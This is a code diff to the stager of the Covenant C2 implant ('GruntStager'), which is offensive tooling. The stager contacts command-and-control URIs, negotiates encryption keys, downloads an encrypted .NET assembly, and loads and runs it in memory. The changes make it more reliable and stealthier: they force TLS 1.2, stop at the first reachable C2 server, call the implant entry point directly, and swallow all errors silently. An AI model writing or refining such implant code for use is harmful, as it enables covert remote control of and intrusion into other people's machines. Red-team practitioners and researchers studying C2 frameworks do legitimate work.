@@ -3,7 +3,6 @@ using System.Net;
 using System.Linq;
 using System.Text;
 using System.Text.RegularExpressions;
-using System.IO.Pipes;
 using System.Reflection;
 using System.Collections.Generic;
 using System.Security.Cryptography;
@@ -58,7 +57,8 @@ namespace GruntStager
                 byte[] hash = hmac.ComputeHash(EncryptedRSAPublicKey);
                 string Stage0Body = String.Format(MessageFormat, aGUID + GUID, "0", "", Convert.ToBase64String(SetupAESKey.IV), Convert.ToBase64String(EncryptedRSAPublicKey), Convert.ToBase64String(hash));
 
-                ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
+                // Use numeric value for Tls12 (3072) for .NET Framework compatibility
+                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
                 ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =>
                 {
                     bool valid = true;
@@ -82,6 +82,7 @@ namespace GruntStager
                 string CovenantURI = "";
                 foreach (string uri in CovenantURIs)
                 {
+                    if (string.IsNullOrEmpty(uri)) continue;
                     try
                     {
                         for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)
@@ -97,11 +98,16 @@ namespace GruntStager
                         }
                         wc.DownloadString(uri + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", ""));
                         CovenantURI = uri;
+                        break;
                     }
                     catch
                     {
                         continue;
                     }
+                }
+                if (string.IsNullOrEmpty(CovenantURI))
+                {
+                    return;
                 }
                 for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)
                 {
@@ -203,9 +209,9 @@ namespace GruntStager
                 SessionKey.IV = Convert.FromBase64String(iv64str);
                 byte[] DecryptedAssembly = SessionKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
                 Assembly gruntAssembly = Assembly.Load(DecryptedAssembly);
-                gruntAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { CovenantURI, CovenantCertHash, GUID, SessionKey });
+                gruntAssembly.GetType("GruntExecutor.Grunt").GetMethod("Execute").Invoke(null, new Object[] { CovenantURI, CovenantCertHash, GUID, SessionKey });
             }
-            catch (Exception e) { Console.Error.WriteLine(e.Message + Environment.NewLine + e.StackTrace); }
+            catch { }
         }
 
         public class CookieWebClient : WebClient
